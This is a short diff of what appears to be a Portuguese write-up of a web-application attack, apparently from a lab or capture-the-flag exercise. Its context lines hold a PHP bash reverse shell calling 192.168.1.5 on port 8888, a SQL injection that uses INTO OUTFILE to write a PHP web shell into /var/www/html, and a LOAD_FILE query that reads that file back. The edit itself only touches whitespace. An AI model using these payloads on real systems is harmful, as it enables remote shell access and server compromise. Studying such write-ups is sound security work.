@@ -262,4 +262,5 @@ Com base no DOCUMENT_ROOT, começámos a tentar acessos à root:
 								 <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.5/8888 0>&1'");
 	
 	1 union SELECT 1,2,3,“<?php shell_exec('ls); ?>”,5 INTO OUTFILE “../../../../../../var/www/html/ls.php”
-	1 union SELECT 1,LOAD_FILE(“../../../../../../var/www/html/ls.php”),3,4,5					 
+	1 union SELECT 1,LOAD_FILE(“../../../../../../var/www/html/ls.php”),3,4,5
+
